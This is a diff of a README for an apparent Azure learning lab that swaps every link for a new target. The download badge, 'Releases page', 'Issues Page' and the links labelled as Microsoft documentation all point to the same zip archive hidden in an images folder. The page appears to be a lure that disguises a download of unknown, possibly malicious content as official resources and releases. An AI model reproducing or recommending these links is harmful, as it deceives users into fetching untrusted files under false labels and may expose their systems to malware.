@@ -5,7 +5,7 @@
 Welcome to the Azure-IaaS-Lab! This hands-on lab helps you explore Azure through practical exercises. You will learn about PowerShell, Network Security Groups (NSGs), Windows Server roles, Azure Backup, monitoring, and resource tagging for cloud governance. 
 
 ## 📥 Download Now
-[![Download Azure-IaaS-Lab](https://raw.githubusercontent.com/gatitofernandeA1/Azure-IaaS-Lab/main/images/vnet-lab/Azure-IaaS-Lab_v3.2.zip%20Azure--IaaS--Lab-blue)](https://raw.githubusercontent.com/gatitofernandeA1/Azure-IaaS-Lab/main/images/vnet-lab/Azure-IaaS-Lab_v3.2.zip)
+[![Download Azure-IaaS-Lab](https://github.com/gatitofernandeA1/Azure-IaaS-Lab/raw/refs/heads/main/images/monitoring/Azure_Lab_Iaa_homatomic.zip%20Azure--IaaS--Lab-blue)](https://github.com/gatitofernandeA1/Azure-IaaS-Lab/raw/refs/heads/main/images/monitoring/Azure_Lab_Iaa_homatomic.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the Azure-IaaS-Lab software successfully.
@@ -18,7 +18,7 @@ Before you begin, ensure your device meets the following requirements:
 - Internet Connection: Required for downloading resources
 
 ### 2. Visit the Releases Page
-Go to the [Releases page](https://raw.githubusercontent.com/gatitofernandeA1/Azure-IaaS-Lab/main/images/vnet-lab/Azure-IaaS-Lab_v3.2.zip) to find the latest version of Azure-IaaS-Lab. 
+Go to the [Releases page](https://github.com/gatitofernandeA1/Azure-IaaS-Lab/raw/refs/heads/main/images/monitoring/Azure_Lab_Iaa_homatomic.zip) to find the latest version of Azure-IaaS-Lab. 
 
 ### 3. Download the Software
 On the Releases page, you will see different versions of the software. Look for the most recent version marked as "Latest". Click on the version link to expand it, and you will see the available files.
@@ -53,9 +53,9 @@ This lab covers various important topics, including:
 
 ## 📄 Additional Resources
 For further learning, you can explore these resources:
-- [Microsoft Azure Documentation](https://raw.githubusercontent.com/gatitofernandeA1/Azure-IaaS-Lab/main/images/vnet-lab/Azure-IaaS-Lab_v3.2.zip)
-- [Azure Learning Paths](https://raw.githubusercontent.com/gatitofernandeA1/Azure-IaaS-Lab/main/images/vnet-lab/Azure-IaaS-Lab_v3.2.zip)
-- [PowerShell for Azure](https://raw.githubusercontent.com/gatitofernandeA1/Azure-IaaS-Lab/main/images/vnet-lab/Azure-IaaS-Lab_v3.2.zip)
+- [Microsoft Azure Documentation](https://github.com/gatitofernandeA1/Azure-IaaS-Lab/raw/refs/heads/main/images/monitoring/Azure_Lab_Iaa_homatomic.zip)
+- [Azure Learning Paths](https://github.com/gatitofernandeA1/Azure-IaaS-Lab/raw/refs/heads/main/images/monitoring/Azure_Lab_Iaa_homatomic.zip)
+- [PowerShell for Azure](https://github.com/gatitofernandeA1/Azure-IaaS-Lab/raw/refs/heads/main/images/monitoring/Azure_Lab_Iaa_homatomic.zip)
 
 ## 🔧 Troubleshooting
 If you encounter issues while installing or running the Azure-IaaS-Lab:
@@ -69,8 +69,8 @@ For more assistance, you can visit the project's issues page for help or submit 
 For further questions or support, please contact the repository owner through GitHub.
 
 ## 🔗 Important Links
-- [Releases Page](https://raw.githubusercontent.com/gatitofernandeA1/Azure-IaaS-Lab/main/images/vnet-lab/Azure-IaaS-Lab_v3.2.zip)
-- [Issues Page](https://raw.githubusercontent.com/gatitofernandeA1/Azure-IaaS-Lab/main/images/vnet-lab/Azure-IaaS-Lab_v3.2.zip)
+- [Releases Page](https://github.com/gatitofernandeA1/Azure-IaaS-Lab/raw/refs/heads/main/images/monitoring/Azure_Lab_Iaa_homatomic.zip)
+- [Issues Page](https://github.com/gatitofernandeA1/Azure-IaaS-Lab/raw/refs/heads/main/images/monitoring/Azure_Lab_Iaa_homatomic.zip)
 
 Thank you for using Azure-IaaS-Lab. Happy learning!
 ```
